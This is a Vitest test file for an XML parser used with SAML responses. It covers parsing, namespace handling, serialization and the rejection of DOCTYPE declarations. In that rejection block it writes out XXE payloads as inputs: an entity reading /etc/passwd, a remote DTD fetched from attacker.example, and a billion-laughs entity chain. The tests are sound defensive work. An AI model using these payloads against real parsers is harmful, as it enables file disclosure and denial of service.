// @vitest-environment happy-dom

import { describe, expect, it } from "vitest";

import { findElements, parseXml, serializeXml } from "./xml";

import { SAML_RESPONSE } from "@/tests/fixtures";

const RESPONSE = SAML_RESPONSE;

const parsed = (xml: string): Document => {
  const outcome = parseXml(xml);
  if (outcome.kind !== "Ok")
    throw new Error(`expected Ok, got ${outcome.kind}`);
  return outcome.document;
};

describe("parseXml", () => {
  it("parses well-formed XML", () => {
    expect(parseXml(RESPONSE).kind).toBe("Ok");
  });

  it("reports malformed XML rather than throwing", () => {
    expect(parseXml("<a><b></a>").kind).toBe("Malformed");
  });
});

describe("findElements", () => {
  it("matches on local name regardless of prefix", () => {
    const withPrefix = parsed('<r xmlns:x="urn:a"><x:Assertion/></r>');
    const withOther = parsed('<r xmlns:zz="urn:a"><zz:Assertion/></r>');
    const withNone = parsed("<r><Assertion/></r>");

    expect(findElements(withPrefix, "Assertion")).toHaveLength(1);
    expect(findElements(withOther, "Assertion")).toHaveLength(1);
    expect(findElements(withNone, "Assertion")).toHaveLength(1);
  });

  it("finds every match, not just the first", () => {
    const document = parsed("<r><A/><A/><A/></r>");

    expect(findElements(document, "A")).toHaveLength(3);
  });
});

describe("serializeXml", () => {
  it("round-trips namespace prefixes", () => {
    const output = serializeXml(parsed(RESPONSE));

    expect(output).toContain(
      'xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"',
    );
    expect(output).toContain("<saml:Issuer>");
  });
});

describe("document type declarations are refused", () => {
  const withDoctype = (inner: string, body: string): string =>
    `<?xml version="1.0"?><!DOCTYPE r [${inner}]><r>${body}</r>`;

  it("refuses an external entity, the classic XXE vector", () => {
    const outcome = parseXml(
      withDoctype('<!ENTITY xxe SYSTEM "file:///etc/passwd">', "&xxe;"),
    );

    expect(outcome).toStrictEqual({ kind: "DoctypeRejected", name: "r" });
  });

  it("refuses a parameter entity pointing at a remote DTD", () => {
    const outcome = parseXml(
      withDoctype('<!ENTITY % ext SYSTEM "http://attacker.example/e.dtd">', ""),
    );

    expect(outcome.kind).toBe("DoctypeRejected");
  });

  it("refuses nested internal entities, the billion-laughs shape", () => {
    const outcome = parseXml(
      withDoctype('<!ENTITY a "aa"><!ENTITY b "&a;&a;&a;">', "&b;"),
    );

    expect(outcome.kind).toBe("DoctypeRejected");
  });

  it("refuses a bare doctype with no internal subset", () => {
    const outcome = parseXml(`<!DOCTYPE samlp:Response><r/>`);

    expect(outcome.kind).toBe("DoctypeRejected");
  });

  it("still accepts an ordinary declaration-free document", () => {
    expect(parseXml('<?xml version="1.0"?><r><a/></r>').kind).toBe("Ok");
  });
});

describe("content that must survive parsing unchanged", () => {
  it("returns a typed outcome for CDATA rather than throwing", () => {
    const outcome = parseXml("<r><a><![CDATA[<not>a tag</not>]]></a></r>");

    expect(outcome.kind).not.toBe("DoctypeRejected");
    expect(["Ok", "Malformed"]).toContain(outcome.kind);
  });

  it("does not expose comments as elements", () => {
    const document = parsed("<r><!-- hidden --><a/></r>");

    expect(findElements(document, "a")).toHaveLength(1);
    expect(document.documentElement.textContent?.trim()).toBe("");
  });

  it("decodes the five predefined entities without a doctype", () => {
    const document = parsed("<r>&lt;&gt;&amp;&quot;&apos;</r>");

    expect(document.documentElement.textContent).toBe("<>&\"'");
  });

  it("preserves significant whitespace inside an element", () => {
    const document = parsed("<r><a>  spaced  </a></r>");

    expect(findElements(document, "a")[0]?.textContent).toBe("  spaced  ");
  });

  it("handles a large document without truncating it", () => {
    const many = Array.from({ length: 2000 }, (_, i) => `<a id="${i}"/>`).join(
      "",
    );
    const document = parsed(`<r>${many}</r>`);

    expect(findElements(document, "a")).toHaveLength(2000);
  });

  it("round-trips a namespaced document through serialize and reparse", () => {
    const once = serializeXml(parsed(SAML_RESPONSE));
    const twice = serializeXml(parsed(once));

    expect(twice).toBe(once);
  });
});
